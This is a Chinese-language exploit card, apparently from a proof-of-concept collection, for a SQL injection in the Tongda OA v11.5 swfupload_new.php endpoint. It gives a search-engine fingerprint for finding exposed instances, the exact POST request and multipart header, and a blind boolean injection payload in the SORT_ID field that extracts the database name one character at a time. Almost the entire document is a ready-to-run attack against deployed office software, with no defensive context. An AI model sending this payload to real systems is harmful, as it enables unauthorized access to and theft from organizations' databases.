# 通达OA-v115-swfupload_new-sql注入

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="TDXK-通达OA"`
- **请求**：`POST /general/file_folder/swfupload_new.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2`

**请求体 / payload**
```
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"
1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"
1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"
2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"
0 RLIKE (SELECT  (CASE WHEN (substr(database(),{i},1)={ej}) THEN 1 ELSE 0x28 END))
------------GFioQpMK0vv2--
```
- **预期**：200　|　—